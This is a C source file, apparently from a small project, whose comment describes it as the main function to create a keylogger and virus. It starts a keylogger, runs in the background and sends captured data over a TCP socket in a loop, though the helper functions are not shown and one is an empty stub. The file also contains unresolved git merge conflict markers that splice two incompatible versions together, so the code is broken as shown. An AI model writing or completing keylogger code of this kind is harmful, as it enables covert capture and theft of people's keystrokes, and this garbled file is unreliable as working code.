/*
Main function to run to create keylogger and virus
*/
<<<<<<< HEAD

#include <arpa/inet.h>
#include <stdio.h>

#include "client.h"
#include "keylogger.h"
#include "server_utils.h"

const socklen_t MAX_IP_ADDR_LEN = 16;

void background_process(void) {
  // IMPLEMENTATION HERE
}

int main(void) {
  // Open a TCP socket to connect to the server.
  int socket_descriptor = open_tcp_socket();
  (void)fprintf(stderr, "Client socket descriptor: %d\n", socket_descriptor);

  // Connect to the server running on this machine (127.0.0.1).
  struct sockaddr_in server_addr = socket_address(INADDR_LOOPBACK, PORT);
  try_connect(socket_descriptor, server_addr);
  // To print an IP address as a string, we need to allocate a buffer.
  char addr_string[MAX_IP_ADDR_LEN];
  (void)fprintf(
      stderr, "Connected to server at %s, port %d\n",
      inet_ntop(AF_INET, &server_addr.sin_addr, addr_string, MAX_IP_ADDR_LEN),
      PORT);

  // Use a file pointer to make it easier to deal with text lines.
  FILE* socket_file = get_socket_file(socket_descriptor);

  // Send data until either the client or the server closes its stream.
  int socket_file_status = 0;
  while (socket_file_status != -1) {
    socket_file_status = send_data(socket_file);
=======
#include "client.h"
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
void main(void) {
  background_process();
  begin_keylogger();
  open_server();

  pid_t my_pid = getpid();
  while (1) {
    transmit_data();
    //printf("%d\n",(int)my_pid);
    sleep(1);
>>>>>>> ee8cf574b73535e009c1e2bd64a97e9382993e8f
  }

  // If we didn't hit the end of file for either stdin or the response from the
  // server, then something went wrong.
  if (!feof(stdin) && !feof(socket_file)) {
    error_and_exit("Error reading or writing line:");
  }

  // Clean up and exit.
  close_tcp_socket(socket_descriptor);
  return 0;
}
